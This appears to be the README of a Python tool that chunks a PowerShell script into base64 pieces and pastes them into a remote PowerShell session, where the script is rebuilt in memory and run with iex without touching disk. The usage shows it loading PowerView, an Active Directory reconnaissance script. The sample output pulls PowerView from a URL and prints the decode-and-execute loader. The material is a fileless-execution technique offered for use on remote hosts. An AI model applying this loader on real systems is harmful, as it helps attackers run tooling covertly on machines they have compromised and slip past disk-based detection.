# ps1MemChunk.py

Build PS1 scripts in memory using Base64 chunks and copy-paste to remote PowerShell session, never touching disk.

Powershell has a command length limit of 8,191 characters. This limits the size of ps1 scripts that can be executed using the `powershell -enc` parameter. This script breaks a large ps1 file into chunks, base64 encodes them, and rebuilds the file in memory piece by piece, then executes it.

```
Usage:
   (local)  python ps1MemChunk.py -file PowerView.ps1 | clip
   (remote) [Ctrl-V] [Enter]
```

## Sample Output
```
python ps1MemChunk.py -url https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1

$tmpMemChunk  = ''
$tmpMemChunk += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("NhZ2VBdHRyaWJ1...dGUoJ1UHJvY2VzcycsICcn")));
$tmpMemChunk += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("m9yIGRvbWFpbiB...0cnVzdnaCBMREFQL0FEU0k")));
$tmpMemChunk += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("vaW50ZXIgYnkgZ...mluZGlhlIHNpemUgb2YgdG")));
iex $tmpMemChunk
```
